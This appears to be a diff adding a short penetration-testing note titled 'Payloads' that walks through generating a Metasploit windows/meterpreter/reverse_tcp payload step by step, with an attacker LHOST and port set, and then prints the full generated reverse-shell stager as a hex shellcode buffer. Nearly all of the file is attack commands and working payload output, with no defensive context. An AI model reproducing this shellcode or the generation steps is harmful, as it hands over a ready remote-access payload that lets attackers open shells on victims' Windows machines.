@@ -1,0 +1,62 @@
+# Payloads
+
+```bash
+# =======================================================================================
+# Step 1
+msf > show payloads
+
+# =======================================================================================
+# Step 2
+msf > use payload/windows/meterpreter/reverse_tcp
+
+# =======================================================================================
+# Step 3
+msf payload(windows/meterpreter/reverse_tcp) > show options
+
+# =======================================================================================
+# Step 4
+set LHOST 192.168.0.108 # NOTE: Attacker HOST
+
+# =======================================================================================
+# Step 5
+msf payload(windows/meterpreter/reverse_tcp) > generate # NOTE: We have many ways to generate payloads
+# windows/meterpreter/reverse_tcp - 297 bytes (stage 1)
+# https://metasploit.com/
+# VERBOSE=false, LHOST=192.168.0.108, LPORT=4444,
+# ReverseAllowProxy=false, ReverseListenerThreaded=false,
+# StagerRetryCount=10, StagerRetryWait=5, PingbackRetries=0,
+# PingbackSleep=30, PayloadUUIDTracking=false,
+# EnableStageEncoding=false, StageEncoderSaveRegisters=,
+# StageEncodingFallback=true, PrependMigrate=false,
+# EXITFUNC=process, AutoLoadStdapi=true,
+# AutoVerifySessionTimeout=30, InitialAutoRunScript=,
+# AutoRunScript=, AutoSystemInfo=true,
+# EnableUnicodeEncoding=false, SessionRetryTotal=3600,
+# SessionRetryWait=10, SessionExpirationTimeout=604800,
+# SessionCommunicationTimeout=300,
+# MeterpreterDebugBuild=false, AutoLoadExtensions=["priv",
+# "stdapi"]
+# buf =
+# "\xfc\xe8\x90\x00\x00\x00\x60\x31\xd2\x89\xe5\x64\x8b\x52" +
+# "\x30\x8b\x52\x0c\x8b\x52\x14\xbf\x44\x86\x76\x13\x0f\xb7" +
+# "\x4a\x24\x8b\x72\x28\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20" +
+# "\xc1\xcf\x0d\x01\xc7\x49\x75\xef\x52\x8b\x52\x10\x8b\x42" +
+# "\x3c\x01\xd0\x57\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50" +
+# "\x8b\x48\x18\x8b\x58\x20\x01\xd3\x85\xc9\x74\x3a\x49\x8b" +
+# "\x7d\xf8\x8b\x34\x8b\x01\xd6\x31\xc0\xc1\xcf\x0d\xac\x01" +
+# "\xc7\x38\xe0\x75\xf4\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24" +
+# "\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b" +
+# "\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0" +
+# "\x58\x5f\x5a\x8b\x12\xe9\x7f\xff\xff\xff\x5d\x68\x33\x32" +
+# "\x00\x00\x68\x77\x73\x32\x5f\x54\x68\xf2\xc8\xe7\xab\x89" +
+# "\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\xe6" +
+# "\x76\x24\xcc\xff\xd5\x6a\x0a\x68\xc0\xa8\x00\x6c\x68\x02" +
+# "\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68" +
+# "\xa7\x06\x98\xac\xff\xd5\x97\x6a\x10\x56\x57\x68\x06\x85" +
+# "\xae\xb4\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68" +
+# "\x04\xa6\x03\xd1\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x33" +
+# "\x10\x77\x73\xff\xd5\x8b\x36\x6a\x40\x68\x00\x10\x00\x00" +
+# "\x56\x6a\x00\x68\xfe\xf5\x14\x8a\xff\xd5\x93\x53\x6a\x00" +
+# "\x56\x53\x57\x68\x33\x10\x77\x73\xff\xd5\x01\xc3\x29\xc6" +
+# "\x75\xee\xc3"
+```
